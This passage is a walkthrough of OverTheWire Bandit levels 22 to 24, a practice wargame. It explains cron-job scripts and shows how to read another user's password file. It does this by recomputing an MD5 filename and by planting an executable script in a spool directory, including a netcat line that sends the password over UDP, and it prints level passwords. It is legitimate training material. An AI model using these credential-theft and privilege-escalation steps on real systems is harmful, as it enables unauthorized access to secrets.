Log in with bandit22 user via ssh and the password `Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI`


The challenge suggests, that we again should have a look into the `/etc/cron.d/` directory. We find a file, which we further investigate

```bash
$ cat /etc/cron.d/cronjob_bandit23

@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

We find out about a file, which gets executed at reboot by `bandit23`

```bash
$ vim /usr/bin/cronjob_bandit23.sh
```

```bash
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```
* At first the name of the currently logged in user gets saved to the variable `myname`
* Next a strings gets build with the variable `myname`. It then gets hashed with MD5. Afterwards the string gets cut into pieces by using a blank as delimeter. The first piece is returned
* In the end the password file gets copied to a file in /tmp wich has the name similar to the result string of the previous step

We conclude that we need to generate the filename in the way the script does it, but we explicitly need to use bandit23 to generate it not our username bandit22, which is the result, if we execute `whoami`

```bash
$ filename=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)

$ cat /tmp/$filename

jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

# bandit23 → bandit24

Log in with bandit23 user via ssh and the password `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`
```bash
$ ssh -p 2220 bandit23@bandit.labs.overthewire.org
```

The challenge suggests, that we again should have a look into the `/etc/cron.d/` directory. We find a file, which we further investigate.

```bash
$ cat /etc/cron.d/cronjob_bandit24

@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

We find out about a file, which gets executed at reboot by `bandit24`

```bash
$ vim /usr/bin/cronjob_bandit24.sh
```

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

* The script saves the result of `whoami` to the variable `myname`
* It then changes it current directory to `/var/spool/<myname>` 
* It then runs a for loop through every file and hidden file (.*) in the current directory
* In every iteration a file gets executed, which is not "." or ".." after 60 seconds the processes which gets invoked by the files are killed through the SIGKILL signal (-s 9). The file gets deleted immediatly after being executed.

In order to solve the challenge we need to write a script, which retrieves the flag and copy the script to /var/spool. There are lots of possibiliies to solve this challenge. I will try two.

[1]

We create a directory in which we store our script with the name `retrieve.sh`

```bash
$ mkdir /tmp/f1oflag
```

`retrieve.sh`
```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/f1oflag/flag.txt
```

We need to create the `flag.txt` file first and make it writable by everyone, because the user `bandit24` does not have the permission to create the file in the directory we just created as `bandit23`.
We need to make the script executable and copy it to the `/var/spool/bandit24` directory

```bash
$ chmod +x retrieve.sh

$ cp retrieve.sh /var/spool/bandit24/retrieve.sh
```

Now we just wait until the flag arrives and read it

```bash
$ cat flag.txt

UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

[2]

The plan ist to listen to UDP packets on a specific port and make the script send the password via UDP.
At first listen for UDP packets with `netcat` in the background

```bash
$ nc -u -l -p 43210 &
```

We create a directory in which we store our script with the name `retrieve.sh`

```bash
$ mkdir /tmp/f1oflag

$ cd /tmp/f1oflag
```

`retrieve.sh`

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 | nc -u localhost 43210
```

We need to make the script executable and copy it to the `/var/spool/bandit24` directory

```bash
$ chmod +x retrieve.sh

$ cp retrieve.sh /var/spool/bandit24/retrieve.sh
```

Now we need to switch back to our `netcat` process with the `fg` command and wait for the flag to arrive

```bash
$ fg

nc -u -l -p 43210
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
